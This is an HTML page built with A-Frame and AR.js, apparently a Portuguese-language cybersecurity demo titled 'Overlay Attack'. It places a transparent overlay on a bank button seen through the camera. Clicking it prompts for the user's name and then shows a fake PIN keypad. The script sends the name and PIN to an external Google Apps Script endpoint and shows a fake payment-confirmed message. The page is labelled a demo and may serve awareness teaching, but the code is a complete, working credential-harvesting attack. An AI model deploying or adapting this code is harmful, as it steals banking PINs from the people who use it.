<!DOCTYPE html>
<html>
  <head>
    <title>Demo Cibersegurança - Overlay Attack</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
  </head>
  
  <body style="margin: 0px; overflow: hidden;">
    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
      
      <a-assets>
        <img id="btnBanco" src="botao_banco2.png">
      </a-assets>

      <a-entity cursor="fuse: false; rayOrigin: mouse" raycaster="objects: .clickable; interval: 10"></a-entity>

      <a-marker type="pattern" url="marker.patt">
        
        <a-image src="#btnBanco" position="0 0.01 0" rotation="-90 0 0" width="2.5" height="3.0"></a-image>

        <a-plane id="malicious-overlay" class="clickable" 
                 position="0 0.05 0" rotation="-90 0 0" 
                 width="2.6" height="3.1" material="opacity: 0.3; color: red" 
                 onclick="abrirPainel()">
        </a-plane>

        <a-entity id="fake-form" position="0 1.2 -1" rotation="-90 0 0" visible="false">
          
          <a-plane width="3" height="3.8" color="#111" material="opacity: 0.95"></a-plane>
          
          <a-text value="CONFIRME SEU PIN" align="center" position="0 1.4 0.1" scale="0.6 0.6 0.6" color="white"></a-text>
          
          <a-plane position="0 0.8 0.1" width="2.4" height="0.5" color="#333">
              <a-text id="pass-display" value="DIGITE..." align="center" position="0 0 0.05" scale="0.8 0.8 0.8" color="#00ff00"></a-text>
          </a-plane>

          <a-plane class="clickable" position="-0.8 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('1')">
            <a-text value="1" align="center" position="0 0 0.01" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('2')">
            <a-text value="2" align="center" position="0 0 0.01" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0.8 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('3')">
            <a-text value="3" align="center" position="0 0 0.01" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 -1.1 0.2" width="2.5" height="0.7" color="#27ae60" onclick="finalizarAtaque()">
              <a-text value="CONFIRMAR PAGAMENTO" align="center" position="0 0 0.01" scale="0.6 0.6 0.6"></a-text>
          </a-plane>
        </a-entity>
        
      </a-marker>

      <a-entity camera></a-entity>
    </a-scene>

    <script>
  let senhaColetada = "";
  let nomeUsuario = "";
  const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";

  function abrirPainel() {
    // 1. Pede o nome
    let entrada = prompt("Para confirmar o pagamento, digite seu NOME:");
    
    if (!entrada) {
        nomeUsuario = "Vítima Curiosa";
    } else {
        nomeUsuario = entrada;
    }

    // 2. O PULO DO GATO: Espera 500ms para o teclado do celular sumir 
    // e o navegador voltar a focar na câmera antes de mostrar o form.
    setTimeout(function() {
        console.log("Retomando AR após entrada de nome...");
        document.querySelector('#fake-form').setAttribute('visible', 'true');
        document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
        
        // Força o sistema de clique a se recalibrar
        const cursor = document.querySelector('[cursor]');
        if (cursor && cursor.components.raycaster) {
            cursor.components.raycaster.refreshObjects();
        }
    }, 500); 
  }

  function registrarDigito(num) {
    senhaColetada += num;
    document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
    
    // Feedback visual do botão
    const el = event.target;
    el.setAttribute('color', '#888');
    setTimeout(() => el.setAttribute('color', '#444'), 100);
  }

  function finalizarAtaque() {
    if (senhaColetada.length === 0) return;

    document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');

    const linkFinal = `${linkPlanilha}?nome=${encodeURIComponent(nomeUsuario)}&senha=${senhaColetada}`;

    fetch(linkFinal, {
      method: 'POST',
      mode: 'no-cors'
    })
    .then(() => {
      alert("🚨 PAGAMENTO CONCLUÍDO!\n\nObrigado, " + nomeUsuario.toUpperCase());
      
      // Reseta tudo para a próxima pessoa
      senhaColetada = "";
      nomeUsuario = "";
      document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
      document.querySelector('#fake-form').setAttribute('visible', 'false');
      document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
    })
    .catch(err => {
      console.error(err);
      alert("Erro ao enviar. Tente novamente.");
    });
  }
</script>
  </body>
</html>
